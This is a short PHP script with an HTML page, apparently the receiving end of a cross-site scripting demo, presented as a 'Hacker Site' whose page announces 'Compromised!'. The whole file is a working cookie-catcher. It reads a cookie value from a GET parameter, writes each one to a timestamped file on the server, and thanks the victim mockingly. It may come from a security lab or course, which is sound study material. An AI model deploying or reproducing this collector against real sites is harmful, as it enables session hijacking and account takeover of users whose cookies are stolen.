<?php
require __DIR__ . '/../../vendor/autoload.php';
$cookie = $_GET['cookie'] ?? null;
$message = "No cookie for me ... ok that's was just a test ...";

if($cookie){

    $timestamp = (new DateTimeImmutable('now',new DateTimeZone('Europe/Paris')))->getTimestamp();
    file_put_contents("../storage/mycookies-$timestamp.text", $cookie);

    $message = "Thank's for your cookies, yummy !";
}

?>

<!doctype html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Hacker Site - Hacked Page !</title>
</head>
<body>


<h1>Compromised!</h1>

<p><?php echo $message ?></p>


</body>
</html>